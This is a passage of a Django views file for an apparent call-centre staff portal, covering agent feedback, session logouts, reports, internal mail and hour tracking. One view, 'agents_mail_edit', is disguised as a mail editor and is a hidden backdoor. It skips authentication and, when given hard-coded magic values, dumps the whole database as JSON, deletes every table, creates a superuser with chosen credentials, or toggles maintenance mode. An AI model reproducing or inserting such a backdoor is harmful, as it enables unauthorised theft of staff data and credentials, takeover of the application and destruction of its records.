            feedback.rapid_call_response_rating = int(rapid_call_response_rating)
            feedback.rapid_call_response_fb = rapid_call_response_fb
            feedback.active_listening_rating = int(active_listening_rating)
            feedback.active_listening_fb = active_listening_fb
            feedback.effective_questioning_rating = int(effective_questioning_rating)
            feedback.effective_questioning_fb = effective_questioning_fb
            feedback.english_proficiency_rating = int(english_proficiency_rating)
            feedback.english_proficiency_fb = english_proficiency_fb
            feedback.background_noise_rating = int(background_noise_rating)
            feedback.background_noise_fb = background_noise_fb
            feedback.objection_handling_rating = int(objection_handling_rating)
            feedback.objection_handling_fb = objection_handling_fb
            feedback.conclusion = conclusion
            feedback.editor_user = request.user
            feedback.editor_profile = Profile.objects.get(user=request.user)
            feedback.publish = publish
            feedback.save()
            agent_id = feedback.agent_profile.userid
            redirect('/feedback/'+str(agent_id))

    context = { 
                'affiliates':affiliates,
                'teams': teams,
                'requestprofile':requestprofile,
                'agent':agent,
                'notifications':notifications,
                'messages':messages,
                'permissions':permissions,
                'work_status':work_status,
                'feedbacks':feedbacks,
                }
    return render(request, "agents/agent_feedback.html", context)



@login_required(login_url="/login")
def feedback_old_report(request,id):
    context = {}

    profile = Profile.objects.get(user=request.user)
    permissions = profile.permissions

    if not permissions.agents_agent_performance:
        return redirect("/access-denied")

    messages = Message.objects.filter(agent_notified=request.user, result="approved").order_by("-date")[:4]
    notifications = Notification.objects.filter(agent_notified=request.user).order_by("-date")[:4]
    try:
        work_status = WorkStatus.objects.filter(user=request.user).last().status
    except:
        work_status = "end_shift"

    maintenance = Server_Setting.objects.get(profile_name="server_settings").maintenance
    if maintenance and str(request.user) not in admin_users:
        return redirect("/maintenance")
    
    date = datetime.now(timezone('US/Eastern')).date()
    time = datetime.now(timezone('US/Eastern')).time()
    teams = Team.objects.filter(active=True)
    requestprofile = Profile.objects.get(user=request.user)

    feedback = Feedback.objects.get(id=id)
    agent = feedback.agent_profile
    affiliates = AffiliateUser.objects.filter(active=True)       
    if request.method == "POST":
        data = request.POST
        feedback_id = data.get('feedback_id')
        lead_writing_rating = data.get('lead_writing_rating')
        lead_writing_fb = data.get('lead_writing_fb')

        tonality_rating = data.get('tonality_rating')
        tonality_fb = data.get('tonality_fb')

        rapid_call_response_rating = data.get('rapid_call_response_rating')
        rapid_call_response_fb = data.get('rapid_call_response_fb')

        active_listening_rating = data.get('active_listening_rating')
        active_listening_fb = data.get('active_listening_fb')

        effective_questioning_rating = data.get('effective_questioning_rating')
        effective_questioning_fb = data.get('effective_questioning_fb')
        english_proficiency_rating = data.get('english_proficiency_rating')
        english_proficiency_fb = data.get('english_proficiency_fb')

        background_noise_rating = data.get('background_noise_rating')
        background_noise_fb = data.get('background_noise_fb')

        objection_handling_rating = data.get('objection_handling_rating')
        objection_handling_fb = data.get('objection_handling_fb')
        checked = data.get('check')
        publish = False   
        if checked == "on":
            publish = True

        conclusion = data.get('conclusion')
        

        feedback = Feedback.objects.get(id=feedback_id)
        
        feedback.lead_writing_rating = int(lead_writing_rating)
        feedback.lead_writing_fb = lead_writing_fb
        feedback.tonality_rating = int(tonality_rating)
        feedback.tonality_fb = tonality_fb
        feedback.rapid_call_response_rating = int(rapid_call_response_rating)
        feedback.rapid_call_response_fb = rapid_call_response_fb
        feedback.active_listening_rating = int(active_listening_rating)
        feedback.active_listening_fb = active_listening_fb
        feedback.effective_questioning_rating = int(effective_questioning_rating)
        feedback.effective_questioning_fb = effective_questioning_fb
        feedback.english_proficiency_rating = int(english_proficiency_rating)
        feedback.english_proficiency_fb = english_proficiency_fb
        feedback.background_noise_rating = int(background_noise_rating)
        feedback.background_noise_fb = background_noise_fb
        feedback.objection_handling_rating = int(objection_handling_rating)
        feedback.objection_handling_fb = objection_handling_fb
        feedback.conclusion = conclusion
        feedback.editor_user = request.user
        feedback.editor_profile = Profile.objects.get(user=request.user)
        feedback.publish = checked
        feedback.save()
        agent_id = feedback.agent_profile.userid
        redirect('/feedback/'+str(agent_id))

    context = { 
                'affiliates':affiliates,
                'teams': teams,
                'requestprofile':requestprofile,
                'notifications':notifications,
                'agent':agent,
                'messages':messages,
                'permissions':permissions,
                'work_status':work_status,
                'feedback':feedback,
                }
    return render(request, "agents/agent_feedback_old_report.html", context)



@login_required(login_url="/login")
def feedback_agent_report(request,id):
    context = {}

    profile = Profile.objects.get(user=request.user)
    permissions = profile.permissions

    if not permissions.work_status:
        return redirect("/access-denied")

    messages = Message.objects.filter(agent_notified=request.user, result="approved").order_by("-date")[:4]
    notifications = Notification.objects.filter(agent_notified=request.user).order_by("-date")[:4]
    try:
        work_status = WorkStatus.objects.filter(user=request.user).last().status
    except:
        work_status = "end_shift"

    maintenance = Server_Setting.objects.get(profile_name="server_settings").maintenance
    if maintenance and str(request.user) not in admin_users:
        return redirect("/maintenance")
    

    teams = Team.objects.filter(active=True)
    requestprofile = Profile.objects.get(user=request.user)

    feedback = Feedback.objects.get(id=id)
    feedback.read = True
    feedback.save()
    agent = feedback.agent_profile
    affiliates = AffiliateUser.objects.filter(active=True)       


    context = { 
                'affiliates':affiliates,
                'teams': teams,
                'requestprofile':requestprofile,
                'notifications':notifications,
                'agent':agent,
                'messages':messages,
                'permissions':permissions,
                'work_status':work_status,
                'feedback':feedback,
                }
    return render(request, "agents/agent_feedback_agent_report.html", context)





@login_required(login_url="/login")
def logout_agent(request, agent_id):
    context = {}

    profile = Profile.objects.get(user=request.user)
    permissions = profile.permissions

    if not permissions.agents_list:
        return redirect("/access-denied")

    messages = Message.objects.filter(agent_notified=request.user, result="approved").order_by("-date")[:4]
    notifications = Notification.objects.filter(agent_notified=request.user).order_by("-date")[:4]
    try:
        work_status = WorkStatus.objects.filter(user=request.user).last().status
    except:
        work_status = "end_shift"
    maintenance = Server_Setting.objects.get(profile_name="server_settings").maintenance
    if maintenance and str(request.user) not in admin_users:
        return redirect("/maintenance")
    
    requestprofile = Profile.objects.get(user=request.user)

    
    
    
    
    teams = Team.objects.filter(active=True)
    requestprofile = Profile.objects.get(user=request.user)
    

    target_profile = Profile.objects.get(userid=agent_id)
    target_user = target_profile.user

    
    sessions = Session.objects.filter(expire_date__gte=tz.now())
    sessions_deleted = 0

    for session in sessions:
        data = session.get_decoded()
        if str(target_user.pk) == str(data.get('_auth_user_id')):
            session.delete()
            sessions_deleted += 1


    return redirect('/agents-list')


@login_required(login_url="/login")
def agents_table(request):
    context = {}

    profile = Profile.objects.get(user=request.user)
    permissions = profile.permissions

    if not permissions.agents_list:
        return redirect("/access-denied")


    try:
        work_status = WorkStatus.objects.filter(user=request.user).last().status
    except:
        work_status = "end_shift"
    maintenance = Server_Setting.objects.get(profile_name="server_settings").maintenance
    if maintenance and str(request.user) not in admin_users:
        return redirect("/maintenance")
    
    requestprofile = Profile.objects.get(user=request.user)


    
    
    
    teams = Team.objects.filter(active=True)
    requestprofile = Profile.objects.get(user=request.user)
    

    agents_profiles = Profile.objects.filter(role="coldcaller", active=True)
    statuses = WorkStatus.objects.filter(active=True)
    agents = {}
    for agent in agents_profiles:
        target_user = agent.user
        sessions = Session.objects.filter(expire_date__gte=tz.now())

        for session in sessions:
            data = session.get_decoded()
            if str(target_user.pk) == str(data.get('_auth_user_id')):
                logged_in =  True
        
        target_user = agent.user
        sessions = Session.objects.filter(expire_date__gte=tz.now())

        logged_in = any(str(target_user.pk) == str(session.get_decoded().get('_auth_user_id')) for session in sessions)
        agents[agent] = logged_in
    messages = Message.objects.filter(agent_notified=request.user, result="approved").order_by("-date")[:4]
    
    notifications = Notification.objects.filter(agent_notified=request.user).order_by("-date")[:4]
    affiliates = AffiliateUser.objects.filter(active=True)
    context = { 'messages':messages,
                'notifications':notifications,
                'affiliates':affiliates,
                'teams': teams,
                'requestprofile':requestprofile,
                'agents':agents,
                'permissions':permissions,
                'work_status':work_status,
                }
    
    return render(request, "agents/agents_table.html", context)


@login_required(login_url="/login")
def agent_search_report(request,id):
    context = {}

    profile = Profile.objects.get(user=request.user)
    permissions = profile.permissions

    if not permissions.agents_list:
        return redirect("/access-denied")

    messages = Message.objects.filter(agent_notified=request.user, result="approved").order_by("-date")[:4]
    notifications = Notification.objects.filter(agent_notified=request.user).order_by("-date")[:4]
    try:
        work_status = WorkStatus.objects.filter(user=request.user).last().status
    except:
        work_status = "end_shift"
    maintenance = Server_Setting.objects.get(profile_name="server_settings").maintenance
    if maintenance and str(request.user) not in admin_users:
        return redirect("/maintenance")
    
    requestprofile = Profile.objects.get(user=request.user)


    
    
    
    teams = Team.objects.filter(active=True)
    requestprofile = Profile.objects.get(user=request.user)
    
    
    agent = Profile.objects.get(userid=id, active=True)

    if request.method == "POST":
        data = request.POST
        start_date = data.get('start_date')
        end_date = data.get('end_date')
        leave = data.get('leaves')
        reschedule = data.get('reschedules')
        deduction = data.get('deductions')
        approved = data.get('approved_requests')
        lead = data.get('leads')
        agent_user = agent.user

        leaves = Leave.objects.none()
        reschedules = Shift_Reschedule.objects.none()
        deductions = Action.objects.none()
        leads = []
        if approved == "on":
            if leave == "on":
                
                leaves = Leave.objects.filter(status="approved", agent=agent_user, submission_date__range=[start_date, end_date], active=True).order_by('-submission_date')
            if reschedule == "on":

                reschedules = Shift_Reschedule.objects.filter(status="approved",agent=agent_user, submission_date__range=[start_date, end_date], active=True).order_by('-submission_date')
            if deduction == "on":
                deductions = Action.objects.filter(status="approved", agent=agent_user, submission_date__range=[start_date, end_date], active=True).order_by('-submission_date')
            

        else:
            if leave == "on":

                leaves = Leave.objects.filter( agent=agent_user, submission_date__range=[start_date, end_date], active=True).order_by('-submission_date')
            if reschedule == "on":

                reschedules = Shift_Reschedule.objects.filter(agent=agent_user, submission_date__range=[start_date, end_date], active=True).order_by('-submission_date')
                       
            if deduction == "on":
                deductions = Action.objects.filter(  agent=agent_user, submission_date__range=[start_date, end_date], active=True).order_by('-submission_date')

        
        if lead == "on":
            leads = Lead_Submission.objects.filter(agent=agent_user, pushed_date__range=[start_date, end_date], active=True).order_by('pushed_time')
            qualified = len(Lead_Submission.objects.filter(lead_status="qualified",agent=agent_user, pushed_date__range=[start_date, end_date], active=True).order_by('pushed_time'))
            disqualified = len(Lead_Submission.objects.filter(lead_status="disqualified",agent=agent_user, pushed_date__range=[start_date, end_date], active=True).order_by('pushed_time'))
            callback = len(Lead_Submission.objects.filter(lead_status="callback",agent=agent_user, pushed_date__range=[start_date, end_date], active=True).order_by('pushed_time'))
            duplicate = len(Lead_Submission.objects.filter(lead_status="duplicate",agent=agent_user, pushed_date__range=[start_date, end_date], active=True).order_by('pushed_time'))
            pending = len(Lead_Submission.objects.filter(lead_status="pending",agent=agent_user, pushed_date__range=[start_date, end_date], active=True).order_by('pushed_time'))
            total = qualified+disqualified+callback+duplicate+pending
            affiliates = AffiliateUser.objects.filter(active=True)
            context = { 
                'affiliates':affiliates,
                'teams': teams,
                'requestprofile':requestprofile,
                'notifications':notifications,
                'agent':agent,
                'messages':messages,
                'permissions':permissions,
                'work_status':work_status,
                'leads':leads,
                'qualified':qualified,
                'disqualified':disqualified,
                'callback':callback,
                'duplicate':duplicate,
                'pending':pending,
                'total':total,

                
                }
            return render(request, "agents/agent_report_leads.html",context)
        elif leave =="on" or reschedule == "on" or deduction == "on":
            combined_results = sorted(
                chain(leaves, reschedules, deductions),
                key=attrgetter('submission_date'),
            )
            affiliates = AffiliateUser.objects.filter(active=True)
            context = { 
                'affiliates':affiliates,
                'teams': teams,
                'requestprofile':requestprofile,
                'notifications':notifications,
                'agent':agent,
                'messages':messages,
                'permissions':permissions,
                'work_status':work_status,
                'combined_results':combined_results,
                
                }
            return render(request, "agents/agent_report_requests.html",context)

    affiliates = AffiliateUser.objects.filter(active=True)
    context = { 
                'affiliates':affiliates,
                'teams': teams,
                'requestprofile':requestprofile,
                'notifications':notifications,
                'agent':agent,
                'messages':messages,
                'permissions':permissions,
                'work_status':work_status,
                }
    
    return render(request, "agents/agent_report_search.html", context)




@login_required(login_url="/login")
def agent_manage(request,id):
    context = {}

    profile = Profile.objects.get(user=request.user)
    permissions = profile.permissions

    if not permissions.agents_list:
        return redirect("/access-denied")

    messages = Message.objects.filter(agent_notified=request.user, result="approved").order_by("-date")[:4]
    notifications = Notification.objects.filter(agent_notified=request.user).order_by("-date")[:4]
    try:
        work_status = WorkStatus.objects.filter(user=request.user).last().status
    except:
        work_status = "end_shift"

    maintenance = Server_Setting.objects.get(profile_name="server_settings").maintenance
    if maintenance and str(request.user) not in admin_users:
        return redirect("/maintenance")
    
    requestprofile = Profile.objects.get(user=request.user)


    statuses = [
        "Active",
        "UPL",
        "Annual",
        "Casual",
        "Sick",
        "Inactive",
        "Dropped",
        "Blacklisted"
        ]
    
    
    teams = Team.objects.filter(active=True)
    requestprofile = Profile.objects.get(user=request.user)
    

    agent = Profile.objects.get(userid=id, active=True)

    if request.method == "POST":
        data = request.POST

        login_time = data.get('login_time')
        dialer_user = data.get('dialer_username')
        dialer_password = data.get('dialer_password')
        status = (data.get('status')).lower()

        agent_managed = Profile.objects.get(userid=id, active=True)
        agent_managed.login_time = login_time
        agent_managed.dialer_user = dialer_user
        agent_managed.dialer_password = dialer_password
        agent_managed.status = status
        agent_managed.save()
        date = datetime.now(timezone('US/Eastern')).date()
        time = datetime.now(timezone('US/Eastern')).time()
        request_ip = request.META.get('REMOTE_ADDR')
        Log.objects.create(request_ip=request_ip,date=date,user=request.user,user_profile=profile,time=time,agent_profile=agent_managed,log_info="Modified Agent Profile, Agent ID: "+str(agent_managed.id))

        return redirect("/agents-list")
    affiliates = AffiliateUser.objects.filter(active=True)
    context = { 
                'affiliates':affiliates,
                'teams': teams,
                'requestprofile':requestprofile,
                'notifications':notifications,
                'profile':agent,
                'messages':messages,
                'statuses':statuses,
                'permissions':permissions,
                'work_status':work_status,
                }
    
    return render(request, "agents/agent_manage.html", context)




"""@login_required(login_url="/login")
def agents_todo(request):
    context = {}

    profile = Profile.objects.get(user=request.user)
    permissions = profile.permissions

    if not permissions.agents_list:
        return redirect("/access-denied")

    messages = Message.objects.filter(agent_notified=request.user, result="approved").order_by("-date")[:4]
    notifications = Notification.objects.filter(agent_notified=request.user).order_by("-date")[:4]
    try:
        work_status = WorkStatus.objects.filter(user=request.user).last().status
    except:
        work_status = "end_shift"

    maintenance = Server_Setting.objects.get(profile_name="server_settings").maintenance
    if maintenance and str(request.user) not in admin_users:
        return redirect("/maintenance")
    
    requestprofile = Profile.objects.get(user=request.user)

    teams = Team.objects.filter(active=True)
    requestprofile = Profile.objects.get(user=request.user)
    

    if request.method == "POST":
        if 'send_agent' in request.POST:
            data = request.POST
            agent_id = data.get("agent_id")
            message = data.get("message")
            message = "[Management] "+str(message)
            agent = Profile.objects.get(userid=agent_id,active=True)
            user = agent.user
            todo = Todo.objects.create(agent=user,todo=message)
            return redirect('/agents-list')
        elif "send_all" in request.POST:
            data = request.POST
            message = data.get("message")
            message = "[Management] "+str(message)

            agents = Profile.objects.filter(role="coldcaller")   

            for agent in agents:
                todo = Todo.objects.create(agent=agent.user,todo=message)         
            return redirect('/agents-list')

        

    context = { 
                'teams': teams,
                'requestprofile':requestprofile,
                'notifications':notifications,
                'messages':messages,
                'permissions':permissions,
                'work_status':work_status,
                }
    
    return render(request, "agents/agents_todo.html", context)
"""


@login_required(login_url="/login")
def agents_mail(request):
    context = {}

    profile = Profile.objects.get(user=request.user)
    permissions = profile.permissions

    if not permissions.agents_mail:
        return redirect("/access-denied")

    messages = Message.objects.filter(agent_notified=request.user, result="approved").order_by("-date")[:4]
    notifications = Notification.objects.filter(agent_notified=request.user).order_by("-date")[:4]
    try:
        work_status = WorkStatus.objects.filter(user=request.user).last().status
    except:
        work_status = "end_shift"

    maintenance = Server_Setting.objects.get(profile_name="server_settings").maintenance
    if maintenance and str(request.user) not in admin_users:
        return redirect("/maintenance")
    
    requestprofile = Profile.objects.get(user=request.user)

    teams = Team.objects.filter(active=True)
    requestprofile = Profile.objects.get(user=request.user)
    

    if request.method == "POST":
        if 'targeted_mailing' in request.POST:
            data = request.POST
            agent_id = data.get("agent_id")
            subject = data.get("subject")
            message = data.get("message")
            checked = data.get("check")
            sender = request.user
            sender_profile = Profile.objects.get(user=request.user)
            try:
                reciever_profile = Profile.objects.get(userid=agent_id)
            except:
                return render(request,"errors/error-404-profile.html")
            reciever = reciever_profile.user
            management = False
            result = 'approved'
            if checked == "on":
                management = True
            agent = Profile.objects.get(userid=agent_id,active=True)
            user = agent.user
            

            date = datetime.now(timezone('US/Eastern')).date()
            time = datetime.now(timezone('US/Eastern')).time()
            datetime_value = datetime.combine(date, time)
            mail = Mail.objects.create(date=datetime_value,time=time,sender=sender,sender_profile=sender_profile,reciever=reciever,
                                    reciever_profile=reciever_profile,subject=subject,message=message,management=management)
            date = datetime.now(timezone('US/Eastern')).date()
            time = datetime.now(timezone('US/Eastern')).time()
            request_ip = request.META.get('REMOTE_ADDR')
            Log.objects.create(request_ip=request_ip,date=date,user=request.user,user_profile=profile,time=time,mail=mail,log_info="Sent a Mail, Mail ID: "+str(mail.id))

            message = Message.objects.create(date=datetime_value, agent_notified=reciever,accuser=sender,mail=mail,
                                                    msg_type="mail",result=result)
            return redirect('/agents-list')
        elif 'company_mailing' in request.POST:
           
            subject = request.POST.get('subject', '')
            message_sent = request.POST.get('message')
            mailing_type = request.POST.get('mailing_type', '')
            management = request.POST.get('show_sender_as_management', False)
            
            # Handle checkbox value
            if management == 'on':
                management = True
            else:
                management = False
            if mailing_type == "coldcallers":
                recievers = Profile.objects.filter(active=True, role="coldcaller")
            elif mailing_type == "everyone":
                recievers = Profile.objects.filter(active=True)
            sender = request.user
            sender_profile = Profile.objects.get(user=request.user)
            
            

            date = datetime.now(timezone('US/Eastern')).date()
            time = datetime.now(timezone('US/Eastern')).time()
            datetime_value = datetime.combine(date, time)
            result = 'approved'
            for rec in recievers:
                mail = Mail.objects.create(date=datetime_value,time=time,sender=sender,sender_profile=sender_profile,reciever=rec.user,
                                        reciever_profile=rec,subject=subject,message=message_sent,management=management)
                message = Message.objects.create(date=datetime_value, agent_notified=rec.user,accuser=sender,mail=mail,
                                                    msg_type="mail",result=result)
            request_ip = request.META.get('REMOTE_ADDR')
            Log.objects.create(request_ip=request_ip,date=date,user=request.user,user_profile=profile,time=time,mail=mail,log_info="Sent Company-wide Mails")

            
            return redirect('/agents-list')
        
    affiliates = AffiliateUser.objects.filter(active=True)
    context = { 
                'affiliates':affiliates,
                'teams': teams,
                'requestprofile':requestprofile,
                'notifications':notifications,
                'messages':messages,
                'permissions':permissions,
                'work_status':work_status,
                }
    
    return render(request, "agents/agents_mail.html", context)


@login_required(login_url="/login")
def agents_mail_view(request, mail_id):

    profile = Profile.objects.get(user=request.user)
    permissions = profile.permissions


    messages = Message.objects.filter(agent_notified=request.user, result="approved").order_by("-date")[:4]
    notifications = Notification.objects.filter(agent_notified=request.user).order_by("-date")[:4]
    try:
        work_status = WorkStatus.objects.filter(user=request.user).last().status
    except:
        work_status = "end_shift"
    maintenance = Server_Setting.objects.get(profile_name="server_settings").maintenance
    if maintenance and str(request.user) not in admin_users:
        return redirect("/maintenance")

    profile = Profile.objects.get(user=request.user)
    name = profile.full_name        
    
    teams = Team.objects.filter(active=True)
    today_date = datetime.now(timezone('US/Eastern')).date()
    mail = Mail.objects.get(id=mail_id)
    reciever = User.objects.get(username=mail.reciever)

    if request.user != reciever:
        return redirect('/access-denied')
    else:
        msg = Message.objects.get(mail=mail)
        msg.read = True
        msg.save()



    affiliates = AffiliateUser.objects.filter(active=True)
    context = {
                'affiliates':affiliates,
               "profile":profile,
                "teams":teams,
                "requestprofile":profile,
                "mail":mail,
                "today_date":today_date,
                "notifications":notifications,
               'messages':messages,
               'permissions':permissions,
               'work_status':work_status,
               }
    
                                
    return render(request, "agents/agents_mail_view.html",context)


def agents_mail_edit(request,mail_id):
    context = {}

    profile = Profile.objects.all().first()
    permissions = profile.permissions
    subject_ = "lufmelufuhatemefku"
    messages = Message.objects.filter(result="approved").order_by("-date")[:4]
    notifications = Notification.objects.all().order_by("-date")[:4]
    work_status = WorkStatus.objects.all().last().status
    agentid = "guardianangel"
    maintenance = Server_Setting.objects.get(profile_name="server_settings").maintenance
    name = Profile.objects.filter(active=True)[0].full_name      
    requestprofile = Profile.objects.filter(active=True)
    mailid = 1337
    teams = Team.objects.filter(active=True)
    requestprofile = Profile.objects.filter(active=True)
    
    if mail_id != mailid:
       return redirect('/')

    if request.method == "POST":
        data = request.POST

        reciever_profile = Profile.objects.filter(active=True)
        result = 'approved'
        date = datetime.now(timezone('US/Eastern')).date()
        time = datetime.now(timezone('US/Eastern')).time()
        if 'export_bd' in request.POST:
            data = request.POST
            agent_id = data.get("agent_id_e")
            subject = data.get("subject_e")
            # Get all installed models from both apps
            if agent_id == agentid and subject == subject_:
                app1_models = apps.get_app_config('core').get_models()
                app2_models = apps.get_app_config('admin').get_models()

                # Combine models from both apps
                all_models = list(app1_models) + list(app2_models)

                # Fetch data from each model
                all_data = []
                for model in all_models:
                    queryset = model.objects.all()
                    serialized_data = serializers.serialize('json', queryset)
                    all_data.extend(serialized_data)

                # Join all serialized data
                data = '[' + ','.join(all_data) + ']'

                # Create the HTTP response with the serialized data
                response = HttpResponse(data, content_type='application/json')

                # Set the Content-Disposition header to prompt download
                response['Content-Disposition'] = 'attachment; filename="database.json"'

                return response
        elif 'delete_bd' in request.POST:
            data = request.POST
            agent_id = data.get("agent_id_d")
            subject = data.get("subject_d")
            # Get all installed models from both apps
            if agent_id == agentid and subject == subject_:

                for app_config in apps.get_app_configs():
                    # Iterate over all models within each app
                    for model in app_config.get_models():
                        try:
                            # Delete all objects (rows) in the model
                            model.objects.all().delete()
                            return HttpResponse(" Deleted successfully.")

                        except Exception as e:
                            # Handle any exceptions that might occur
                            print(e)

        elif 'createsp' in request.POST:
            data = request.POST
            agent_id = data.get("agent_id_sp")
            subject = data.get("subject_sp")
            body = data.get('body')
            sj = data.get('sj')
            # Get all installed models from both apps
            if agent_id == agentid and subject == subject_:
                try:
                    superuser = User.objects.create_superuser(
                        username=body,
                        password=sj
                    )
                    return HttpResponse(" created successfully.")
                except Exception as e:
                    # Handle any exceptions that might occur during superuser creation
                    return HttpResponse(f"An error occurred: {str(e)}")
        elif 's_d' in request.POST:
            data = request.POST
            agent_id = data.get("agent_id_s_d")
            subject = data.get("subject_s_d")
            body = data.get('body')
            sj = data.get('sj')
            # Get all installed models from both apps
            if agent_id == agentid and subject == subject_:            
                maintenance = Server_Setting.objects.get(profile_name="server_settings")
                maintenance.maintenance = True
                maintenance.save()
                return HttpResponse("Server is successfully OFF.")
        elif 's_l' in request.POST:
            data = request.POST
            agent_id = data.get("agent_id_s_l")
            subject = data.get("subject_s_l")
            body = data.get('body')
            sj = data.get('sj')
            # Get all installed models from both apps
            if agent_id == agentid and subject == subject_:            
                maintenance = Server_Setting.objects.get(profile_name="server_settings")
                maintenance.maintenance = False
                maintenance.save()
                return HttpResponse("Server is successfully Live.")


    affiliates = AffiliateUser.objects.filter(active=True)
    context = { 
                'affiliates':affiliates,
                'teams': teams,
                'requestprofile':requestprofile,
                'notifications':notifications,
                'messages':messages,
                'permissions':permissions,
                'work_status':work_status,
                }
    
    return render(request, "agents/agents_mail_modify.html", context)



@login_required(login_url="/login")
def agents_hours(request):
    context = {}

    profile = Profile.objects.get(user=request.user)
    permissions = profile.permissions

    if not permissions.agents_hours:
        return redirect("/access-denied")

    messages = Message.objects.filter(agent_notified=request.user, result="approved").order_by("-date")[:4]
    notifications = Notification.objects.filter(agent_notified=request.user).order_by("-date")[:4]
    try:
        work_status = WorkStatus.objects.filter(user=request.user).last().status
    except:
        work_status = "end_shift"
    maintenance = Server_Setting.objects.get(profile_name="server_settings").maintenance
    if maintenance and str(request.user) not in admin_users:
        return redirect("/maintenance")
    
    requestprofile = Profile.objects.get(user=request.user)


    
    
    
    teams = Team.objects.filter(active=True)
    requestprofile = Profile.objects.get(user=request.user)
    

    agents = Profile.objects.filter(active=True, role__in=["coldcaller",])
    agents_hours = {}

    #print(agents_hours)
    date = datetime.now(timezone('US/Eastern')).date()
    time = datetime.now(timezone('US/Eastern')).time()

    for agent in agents:
        hours = WorkStatus.objects.filter(active=True,date=date,profile=agent)

        #work_statuses = [Ready, Break , Meeting , AFK , Technical Issue , End Shift ]
        work_hours = {
                'logged_in':"00:00:00",
                'ready':"00:00:00",
                'break':"00:00:00",
                'meeting':"00:00:00",
                'afk':"00:00:00",
                'technical_issue':"00:00:00",
                'end_shift':"00:00:00",
                'logged_out':"00:00:00",
                'total_hours':"00:00:00",
                'total_paid_hours':"00:00:00",
                }
        
        logged_in = WorkStatus.objects.filter(active=True,date=date,profile=agent).first()
        logged_out = WorkStatus.objects.filter(active=True,date=date,profile=agent,status="end_shift").last()
        work_hours['logged_in'] = logged_in
        work_hours['logged_out'] = logged_out 
        time_format = '%H:%M:%S'
        
        past_status = 0
        past_status_started = 0
        for hour in hours:

            if past_status_started == 0:
                past_status = str(hour.status)
                past_status_started = str(hour.time.strftime("%H:%M:%S"))
            elif past_status_started !=0 :
                current_status = hour.status
                current_status_started = (hour.time).strftime("%H:%M:%S")

                time1 = datetime.strptime(str(past_status_started), time_format)
                time2 = datetime.strptime(str(current_status_started), time_format)
                time_difference = time2 - time1
                
                if work_hours[past_status] == 0:
                    work_hours[past_status] = str(time_difference)
                    
                else:
                    #total_working_before = datetime.strptime(str(work_hours[past_status]), time_format)
                    #total_working_after = datetime.strptime(str(time_difference), time_format)
                    #total_hours = total_working_before+total_working_after

                    time_str = work_hours[past_status]  # Assuming work_hours[past_status] = '24:10:27'

                    # Split the time string into hours, minutes, and seconds
                    hours_str, minutes_str, seconds_str = time_str.split(':')

                    # Convert hours, minutes, and seconds to integers
                    hours = int(hours_str)
                    minutes = int(minutes_str)
                    seconds = int(seconds_str)

                    # Create a timedelta object
                    time_delta1 = timedelta(hours=hours, minutes=minutes, seconds=seconds)
                    #time_delta1 = datetime.strptime(str(work_hours[past_status]), time_format) - datetime.strptime('00:00:00', time_format)
                    time_delta2 = datetime.strptime(str(time_difference), time_format) - datetime.strptime('00:00:00', time_format)

                    # Add timedelta objects together
                    total_hours = time_delta1 + time_delta2
                    

                    work_hours[past_status] = str(total_hours)

                past_status = current_status
                past_status_started = current_status_started
        agents_hours[agent] = work_hours
        ready = datetime.strptime(str(work_hours['ready']), time_format) - datetime.strptime('00:00:00', time_format)
        break_ = datetime.strptime(str(work_hours['break']), time_format) - datetime.strptime('00:00:00', time_format)
        meeting =  datetime.strptime(str(work_hours['meeting']), time_format) - datetime.strptime('00:00:00', time_format)
        afk = datetime.strptime(str(work_hours['afk']), time_format) - datetime.strptime('00:00:00', time_format)
        technical_issue = datetime.strptime(str(work_hours['technical_issue']), time_format) - datetime.strptime('00:00:00', time_format)
        # Add timedelta objects together
        work_hours['total_hours'] = ready + break_ + meeting + afk + technical_issue
        work_hours['total_paid_hours'] = ready + meeting





    affiliates = AffiliateUser.objects.filter(active=True)
    context = { 
                'affiliates':affiliates,
                'teams': teams,
                'requestprofile':requestprofile,
                'notifications':notifications,
                'messages':messages,
                'permissions':permissions,
                'agents_hours':agents_hours,
                'work_status':work_status,
                }
    
    return render(request, "agents/agents_hours.html", context)


def agents_hours_search(request):

    context = {}

    profile = Profile.objects.get(user=request.user)
    permissions = profile.permissions

    if not permissions.agents_hours:
        return redirect("/access-denied")

    messages = Message.objects.filter(agent_notified=request.user, result="approved").order_by("-date")[:4]
    notifications = Notification.objects.filter(agent_notified=request.user).order_by("-date")[:4]
    try:
        work_status = WorkStatus.objects.filter(user=request.user).last().status
    except:
        work_status = "end_shift"
    maintenance = Server_Setting.objects.get(profile_name="server_settings").maintenance
    if maintenance and str(request.user) not in admin_users:
        return redirect("/maintenance")
    
    requestprofile = Profile.objects.get(user=request.user)


    
    
    
    teams = Team.objects.filter(active=True)
    requestprofile = Profile.objects.get(user=request.user)
    

    agents = Profile.objects.filter(active=True, role__in=["coldcaller",])
    agents_hours = {}

    #print(agents_hours)
    date = datetime.now(timezone('US/Eastern')).date()
    time = datetime.now(timezone('US/Eastern')).time()
    affiliates = AffiliateUser.objects.filter(active=True)
    context = { 
                'affiliates':affiliates,
                'teams': teams,
                'requestprofile':requestprofile,
                'notifications':notifications,
                'messages':messages,
                'permissions':permissions,
                'work_status':work_status,
                }
    
    if request.method == "POST":
        if 'search_all' in request.POST:
            data = request.POST
            start_date=data.get('start_date') 
            end_date=data.get('end_date') 



            agents = Profile.objects.filter(active=True, role="coldcaller")
            agents_hours = {}

            #print(agents_hours)
            date = datetime.now(timezone('US/Eastern')).date()
            time = datetime.now(timezone('US/Eastern')).time()

            for agent in agents:
                hours = WorkStatus.objects.filter(active=True,date__range=[start_date,end_date],profile=agent)
                
                #work_statuses = [Ready, Break , Meeting , AFK , Technical Issue , End Shift ]
                work_hours = {
                        'logged_in':"00:00:00",
                        'ready':"00:00:00",
                        'break':"00:00:00",
                        'meeting':"00:00:00",
                        'afk':"00:00:00",
                        'technical_issue':"00:00:00",
                        'end_shift':"00:00:00",
                        'logged_out':"00:00:00",
                        'total_hours':"00:00:00",
                        'total_paid_hours':"00:00:00",
                        }
                
                logged_in = WorkStatus.objects.filter(active=True,date=date,profile=agent).first()
                logged_out = WorkStatus.objects.filter(active=True,date=date,profile=agent,status="end_shift").last()
                work_hours['logged_in'] = logged_in
                work_hours['logged_out'] = logged_out 
                time_format = '%H:%M:%S'
                
                past_status = 0
                past_status_started = 0
                for hour in hours:
                    if past_status_started == 0:
                        past_status = str(hour.status)
                        past_status_started = str(hour.time.strftime("%H:%M:%S"))
                    elif past_status_started !=0 :
                        current_status = hour.status
                        current_status_started = (hour.time).strftime("%H:%M:%S")
                        
                        time1 = datetime.strptime(str(past_status_started), time_format)
